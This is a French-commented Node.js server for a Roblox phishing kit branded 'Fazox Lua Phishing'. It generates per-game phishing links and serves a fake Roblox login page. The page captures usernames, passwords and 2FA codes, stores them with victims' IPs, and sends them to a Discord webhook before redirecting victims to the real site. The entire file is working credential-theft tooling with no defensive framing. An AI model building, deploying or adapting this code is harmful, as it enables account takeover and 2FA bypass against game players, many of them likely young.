// server.js
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'fazox-super-secret-key';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'FAZOXLEGOAT123';

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// ========== Base de données SQLite ==========
const db = new sqlite3.Database('./db.sqlite');

db.serialize(() => {
  // Table des liens de phishing
  db.run(`CREATE TABLE IF NOT EXISTS phish_links (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    game TEXT NOT NULL,
    slug TEXT UNIQUE NOT NULL,
    clicks INTEGER DEFAULT 0,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);

  // Table des logs de capture
  db.run(`CREATE TABLE IF NOT EXISTS logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT,
    password TEXT,
    code TEXT,
    game TEXT,
    user_agent TEXT,
    ip TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    replayed INTEGER DEFAULT 0
  )`);

  // Table des scripts
  db.run(`CREATE TABLE IF NOT EXISTS scripts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT NOT NULL,
    description TEXT,
    content TEXT,
    version TEXT DEFAULT '1.0',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);

  // Table des utilisateurs (pour l'admin)
  db.run(`CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE,
    password_hash TEXT
  )`);

  // Insérer un admin par défaut si inexistant
  const adminHash = bcrypt.hashSync(ADMIN_PASSWORD, 10);
  db.run(`INSERT OR IGNORE INTO users (username, password_hash) VALUES (?, ?)`, ['admin', adminHash]);
});

// ========== Middleware d'authentification JWT ==========
function authenticateToken(req, res, next) {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'Token manquant' });

  jwt.verify(token, JWT_SECRET, (err, user) => {
    if (err) return res.status(403).json({ error: 'Token invalide' });
    req.user = user;
    next();
  });
}

// ========== Routes d'authentification ==========
app.post('/api/login', (req, res) => {
  const { password } = req.body;
  if (!password) return res.status(400).json({ error: 'Mot de passe requis' });

  db.get('SELECT password_hash FROM users WHERE username = ?', ['admin'], (err, row) => {
    if (err || !row) return res.status(401).json({ error: 'Utilisateur non trouvé' });
    const valid = bcrypt.compareSync(password, row.password_hash);
    if (!valid) return res.status(401).json({ error: 'Mot de passe incorrect' });

    const token = jwt.sign({ username: 'admin' }, JWT_SECRET, { expiresIn: '24h' });
    res.json({ token });
  });
});

// ========== Routes Phishing ==========
// Générer un lien phishing
app.post('/api/generate-phish', authenticateToken, (req, res) => {
  const { game, slug: customSlug } = req.body;
  if (!game) return res.status(400).json({ error: 'Nom du jeu requis' });

  const slug = customSlug ? slugify(customSlug) : slugify(game);
  db.get('SELECT id FROM phish_links WHERE slug = ?', [slug], (err, row) => {
    if (row) return res.status(400).json({ error: 'Ce slug existe déjà' });

    db.run('INSERT INTO phish_links (game, slug) VALUES (?, ?)', [game, slug], function(err) {
      if (err) return res.status(500).json({ error: err.message });
      const link = `http://${req.get('host')}/p/${slug}`;
      res.json({ link, slug, id: this.lastID });
    });
  });
});

// Récupérer tous les liens phishing
app.get('/api/phish-links', authenticateToken, (req, res) => {
  db.all('SELECT * FROM phish_links ORDER BY created_at DESC', (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

// Supprimer un lien phishing
app.delete('/api/phish-links/:id', authenticateToken, (req, res) => {
  const { id } = req.params;
  db.run('DELETE FROM phish_links WHERE id = ?', [id], function(err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ message: 'Supprimé' });
  });
});

// ========== Servir la page de phishing ==========
app.get('/p/:slug', (req, res) => {
  const { slug } = req.params;
  db.get('SELECT game FROM phish_links WHERE slug = ?', [slug], (err, row) => {
    if (err || !row) return res.status(404).send('Lien invalide');

    // Incrémenter les clics
    db.run('UPDATE phish_links SET clicks = clicks + 1 WHERE slug = ?', [slug]);

    const gameName = row.game;
    // Récupérer le webhook depuis la base (on peut stocker dans une table settings)
    // Pour l'instant, on utilise une variable d'environnement ou un paramètre global
    const webhook = process.env.DISCORD_WEBHOOK || '';

    // Générer la page HTML (reprise de la fausse page)
    const html = generateFakeLoginPage(gameName, webhook, slug);
    res.send(html);
  });
});

// ========== Soumission des identifiants ==========
app.post('/api/submit', (req, res) => {
  const { username, password, code, game, userAgent } = req.body;
  if (!username || !password) return res.status(400).json({ error: 'Identifiants manquants' });

  const ip = req.ip || req.connection.remoteAddress;

  // Insérer dans la base
  db.run(
    `INSERT INTO logs (username, password, code, game, user_agent, ip)
     VALUES (?, ?, ?, ?, ?, ?)`,
    [username, password, code || '', game || 'Inconnu', userAgent || '', ip],
    function(err) {
      if (err) console.error(err);
    }
  );

  // Envoyer au webhook Discord
  const webhook = process.env.DISCORD_WEBHOOK || '';
  if (webhook) {
    const embed = {
      title: '🎣 Nouvelle capture Roblox',
      color: 0x00b2ff,
      fields: [
        { name: '👤 Pseudo', value: username, inline: true },
        { name: '🔑 Mot de passe', value: password, inline: true },
        { name: '🔢 Code 2FA', value: code || 'Non fourni', inline: true },
        { name: '🎮 Jeu', value: game || 'Inconnu', inline: true },
        { name: '🌐 IP', value: ip, inline: true }
      ],
      footer: { text: 'Fazox Lua Phishing' },
      timestamp: new Date().toISOString()
    };
    axios.post(webhook, { embeds: [embed] }).catch(err => console.error('Webhook error:', err.message));
  }

  res.json({ message: 'OK' });
});

// ========== Routes Admin pour les logs ==========
app.get('/api/logs', authenticateToken, (req, res) => {
  db.all('SELECT * FROM logs ORDER BY timestamp DESC', (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

app.post('/api/replay/:id', authenticateToken, (req, res) => {
  const { id } = req.params;
  db.get('SELECT * FROM logs WHERE id = ?', [id], (err, log) => {
    if (err || !log) return res.status(404).json({ error: 'Log non trouvé' });

    const webhook = process.env.DISCORD_WEBHOOK || '';
    if (!webhook) return res.status(400).json({ error: 'Webhook non configuré' });

    const embed = {
      title: '🔄 Replay - Capture Roblox',
      color: 0x00b2ff,
      fields: [
        { name: '👤 Pseudo', value: log.username, inline: true },
        { name: '🔑 Mot de passe', value: log.password, inline: true },
        { name: '🔢 Code', value: log.code || 'Non fourni', inline: true },
        { name: '🎮 Jeu', value: log.game || 'Inconnu', inline: true },
        { name: '🌐 IP', value: log.ip || 'Inconnue', inline: true }
      ],
      footer: { text: 'Replay via Fazox Admin' },
      timestamp: new Date().toISOString()
    };
    axios.post(webhook, { embeds: [embed] })
      .then(() => {
        db.run('UPDATE logs SET replayed = 1 WHERE id = ?', [id]);
        res.json({ message: 'Replay envoyé' });
      })
      .catch(err => res.status(500).json({ error: err.message }));
  });
});

app.delete('/api/logs/:id', authenticateToken, (req, res) => {
  const { id } = req.params;
  db.run('DELETE FROM logs WHERE id = ?', [id], function(err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ message: 'Supprimé' });
  });
});

// ========== Routes Scripts ==========
app.get('/api/scripts', authenticateToken, (req, res) => {
  db.all('SELECT * FROM scripts ORDER BY created_at DESC', (err, rows) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(rows);
  });
});

app.post('/api/scripts', authenticateToken, (req, res) => {
  const { name, description, content, version } = req.body;
  if (!name || !content) return res.status(400).json({ error: 'Nom et contenu requis' });
  db.run(
    'INSERT INTO scripts (name, description, content, version) VALUES (?, ?, ?, ?)',
    [name, description || '', content, version || '1.0'],
    function(err) {
      if (err) return res.status(500).json({ error: err.message });
      res.json({ id: this.lastID });
    }
  );
});

app.put('/api/scripts/:id', authenticateToken, (req, res) => {
  const { id } = req.params;
  const { name, description, content, version } = req.body;
  db.run(
    'UPDATE scripts SET name = ?, description = ?, content = ?, version = ? WHERE id = ?',
    [name, description || '', content, version || '1.0', id],
    function(err) {
      if (err) return res.status(500).json({ error: err.message });
      res.json({ message: 'Mis à jour' });
    }
  );
});

app.delete('/api/scripts/:id', authenticateToken, (req, res) => {
  const { id } = req.params;
  db.run('DELETE FROM scripts WHERE id = ?', [id], function(err) {
    if (err) return res.status(500).json({ error: err.message });
    res.json({ message: 'Supprimé' });
  });
});

// ========== Utilitaires ==========
function slugify(str) {
  return (str || '').toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '').slice(0, 32);
}

function generateFakeLoginPage(gameName, webhook, slug) {
  return `
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Log in - Roblox</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0;}
  body{background:#1a1a2e;font-family:'Inter',system-ui,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;}
  .login-box{background:#16213e;padding:40px 32px;border-radius:16px;border:1px solid rgba(255,255,255,0.1);width:100%;max-width:400px;box-shadow:0 20px 60px rgba(0,0,0,0.6);}
  .login-box .logo{text-align:center;font-size:28px;font-weight:800;color:#fff;margin-bottom:8px;letter-spacing:-0.5px;}
  .login-box .logo span{color:#00b2ff;}
  .login-box .sub{text-align:center;color:#9aa9c9;font-size:14px;margin-bottom:24px;}
  .login-box .field{margin-bottom:16px;}
  .login-box .field label{display:block;color:#b0c4e8;font-size:13px;font-weight:600;margin-bottom:6px;}
  .login-box .field input{width:100%;padding:12px 14px;border-radius:10px;border:1px solid #2a3a5e;background:#0f1a2e;color:#fff;font-size:14px;outline:none;transition:0.2s;}
  .login-box .field input:focus{border-color:#00b2ff;box-shadow:0 0 0 3px rgba(0,178,255,0.2);}
  .login-box .btn{width:100%;padding:12px;background:#00b2ff;border:none;border-radius:10px;color:#fff;font-size:16px;font-weight:700;cursor:pointer;transition:0.2s;margin-top:8px;}
  .login-box .btn:hover{background:#0099e6;}
  .login-box .footer{text-align:center;margin-top:16px;color:#7a8aaa;font-size:13px;}
  .login-box .footer a{color:#00b2ff;text-decoration:none;}
  .login-box .error{color:#ff6b6b;font-size:13px;margin-top:8px;display:none;text-align:center;}
  .login-box .loading{display:none;text-align:center;color:#00b2ff;font-size:14px;margin-top:12px;}
</style>
</head>
<body>
<div class="login-box">
  <div class="logo">Fazox<span>Lua</span></div>
  <div class="sub">Connectez-vous pour rejoindre <strong>${escapeHtml(gameName)}</strong></div>
  <form id="loginForm">
    <div class="field"><label>Nom d'utilisateur</label><input type="text" id="username" placeholder="Entrez votre pseudo" required /></div>
    <div class="field"><label>Mot de passe</label><input type="password" id="password" placeholder="Mot de passe" required /></div>
    <div class="field"><label>Code de sécurité (si demandé)</label><input type="text" id="code" placeholder="Code 2FA (optionnel)" /></div>
    <button type="submit" class="btn">Se connecter</button>
    <div class="error" id="loginError">Identifiants incorrects.</div>
    <div class="loading" id="loginLoading">Connexion en cours...</div>
  </form>
  <div class="footer"><a href="https://www.roblox.com" target="_blank">Mot de passe oublié ?</a></div>
</div>
<script>
  const form = document.getElementById('loginForm');
  const error = document.getElementById('loginError');
  const loading = document.getElementById('loginLoading');
  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    const code = document.getElementById('code').value.trim();
    if (!username || !password) {
      error.style.display = 'block';
      error.textContent = 'Veuillez remplir tous les champs.';
      return;
    }
    error.style.display = 'none';
    loading.style.display = 'block';
    const data = { username, password, code, game: "${escapeHtml(gameName)}", userAgent: navigator.userAgent };
    try {
      await fetch('/api/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
      loading.textContent = 'Connexion réussie, redirection...';
      setTimeout(() => { window.location.href = 'https://www.roblox.com/login'; }, 1200);
    } catch (err) {
      loading.style.display = 'none';
      error.style.display = 'block';
      error.textContent = 'Erreur de connexion. Réessayez.';
    }
  });
</script>
</body>
</html>
  `;
}

function escapeHtml(text) {
  const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;' };
  return text.replace(/[&<>"']/g, m => map[m]);
}

// ========== Démarrer le serveur ==========
app.listen(PORT, () => {
  console.log(`🚀 Fazox backend démarré sur http://localhost:${PORT}`);
  console.log(`🔐 Admin password: ${ADMIN_PASSWORD}`);
  console.log(`📦 Webhook Discord: ${process.env.DISCORD_WEBHOOK || 'non défini'}`);
});